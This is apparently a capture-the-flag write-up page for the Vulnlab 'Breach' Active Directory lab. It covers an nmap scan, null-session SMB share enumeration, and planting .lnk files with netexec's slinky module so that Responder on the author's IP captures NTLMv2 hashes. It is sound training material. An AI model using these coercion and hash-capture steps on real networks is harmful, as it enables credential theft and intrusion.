+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/bailey-bradshaw-194597198/"
+          target="_blank"
+          aria-label="Hackthebox"
+          title="Hackthebox"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"></span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h2 class="relative group">Overview 
+    <div id="overview" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#overview" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li><strong>Platform</strong>: Vulnlab</li>
+<li><strong>Difficulty</strong>: Medium</li>
+<li><strong>OS</strong>: Windows</li>
+<li><strong>Skills</strong>: Active Directory, privilege escalation, mssql</li>
+</ul>
+<p><em><strong>Assumed Breach Credentials: No assumed breach</strong></em></p>
+
+<h2 class="relative group">Reconnaissance 
+    <div id="reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#reconnaissance" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Nmap Scan 
+    <div id="nmap-scan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nmap-scan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV -p- -T4 $IP -vv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        syn-ack ttl <span style="color:#ae81ff">127</span> Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: IIS Windows Server
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-10-09 18:17:27Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: breach.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds? syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   10.10.72.195:1433: 
+</span></span><span style="display:flex;"><span>|     Target_Name: BREACH
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: BREACH
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: BREACHDC
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: breach.vl
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: BREACHDC.breach.vl
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: breach.vl
+</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.20348
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>| ms-sql-info: 
+</span></span><span style="display:flex;"><span>|   10.10.72.195:1433: 
+</span></span><span style="display:flex;"><span>|     Version: 
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-10-09T18:18:56+00:00; +1m58s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: BREACH
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: BREACH
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: BREACHDC
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: breach.vl
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: BREACHDC.breach.vl
+</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: breach.vl
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.20348
+</span></span><span style="display:flex;"><span>|_  System_Time: 2025-10-09T18:18:16+00:00
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>BREACHDC.breach.vl
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>BREACHDC.breach.vl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-10-09T18:18:56+00:00; +1m59s from scanner time.
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Add <code>breach.vl</code> and <code>breachdc.breach.vl</code> to <code>/etc/hosts</code></p>
+<p>First, we can check smb for null authentication, see if we can read or write to any shares.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.81.20 -u <span style="color:#e6db74">&#39;f&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:BREACHDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:breach.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> breach.vl<span style="color:#ae81ff">\f</span>: 
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         ADMIN$                          Remote Admin                                                                                            
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         C$                              Default share                                                                                           
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         NETLOGON                        Logon server share                                                                                      
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         share           READ,WRITE      
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         SYSVOL                          Logon server share                                                                                      
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         Users           READ 
+</span></span></code></pre></div><p>Seems we can null authenticate, read some shares and even write to one of them.
+Since we dont have breached credentials to access any of the services running on the box, or run bloodhound - our foothold could be through this writeable share.</p>
+<p>Whenever i see i can write to a share, i first try the <code>netexec</code> <code>slinky</code> module, which puts .lnk files redirecting to our local share location in order to grab hashes. We can then catch these hashes with <code>responder</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb breach.vl -u test -p <span style="color:#e6db74">&#39;&#39;</span> -M slinky -o name<span style="color:#f92672">=</span>beejay server<span style="color:#f92672">=</span>10.8.7.149
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:BREACHDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:breach.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> breach.vl<span style="color:#ae81ff">\t</span>est: <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         ADMIN$                          Remote Admin                                                                                            
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         C$                              Default share                                                                                           
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         NETLOGON                        Logon server share                                                                                      
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         share           READ,WRITE      
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         SYSVOL                          Logon server share                                                                                      
+</span></span><span style="display:flex;"><span>SMB         10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         Users           READ            
+</span></span><span style="display:flex;"><span>SLINKY      10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found writable share: share
+</span></span><span style="display:flex;"><span>SLINKY      10.10.81.20     <span style="color:#ae81ff">445</span>    BREACHDC         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Created LNK file on the share share
+</span></span></code></pre></div><p>Note that after starting Responder, you wont get an initial callback even waiting for some time, this is because the slinky module puts the .lnk file in the share root location, but if there are more directories in that share, it wont detect them.</p>
+<p>Therefore, go into &ldquo;share&rdquo; and get that .lnk file, move do the other directories in the share and put it in them manually, then start responder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0 -v
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
+</span></span><span style="display:flex;"><span>                   |__|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    NBT-NS                     <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    MDNS                       <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DNS                        <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DHCP                       <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    HTTPS server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    WPAD proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Auth proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SMB server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Kerberos server            <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SQL server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    FTP server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    IMAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    POP3 server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SMTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DNS server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    LDAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    MQTT server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    RDP server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DCE-RPC server             <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    WinRM server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SNMP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTTP Options:
+</span></span><span style="display:flex;"><span>    Always serving EXE         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Serving EXE                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Serving HTML               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Upstream Proxy             <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoning Options:
+</span></span><span style="display:flex;"><span>    Analyze Mode               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force WPAD auth            <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force Basic Auth           <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force LM downgrade         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force ESS downgrade        <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generic Options:
+</span></span><span style="display:flex;"><span>    Responder NIC              <span style="color:#f92672">[</span>tun0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder IP               <span style="color:#f92672">[</span>10.8.7.149<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder IPv6             <span style="color:#f92672">[</span>fe80::ff8b:1180:777f:3c81<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Challenge set              <span style="color:#f92672">[</span>random<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Don<span style="color:#e6db74">&#39;t Respond To Names     [&#39;</span>ISATAP<span style="color:#e6db74">&#39;, &#39;</span>ISATAP.LOCAL<span style="color:#e6db74">&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Don&#39;</span>t Respond To MDNS TLD  <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;_DOSVC&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    TTL <span style="color:#66d9ef">for</span> poisoned response  <span style="color:#f92672">[</span>default<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Current Session Variables:
+</span></span><span style="display:flex;"><span>    Responder Machine Name     <span style="color:#f92672">[</span>WIN-CF23CVPX6EP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder Domain Name      <span style="color:#f92672">[</span>JASG.LOCAL<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder DCE-RPC Port     <span style="color:#f92672">[</span>47264<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Version: Responder 3.1.7.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Author: Laurent Gaffie, &lt;lgaffie@secorizon.com&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> To sponsor Responder: https://paypal.me/PythonResponder
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...                                                                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error starting TCP server on port 389, check permissions or other servers running.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.10.81.20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : BREACH<span style="color:#ae81ff">\J</span>ulia.Wong
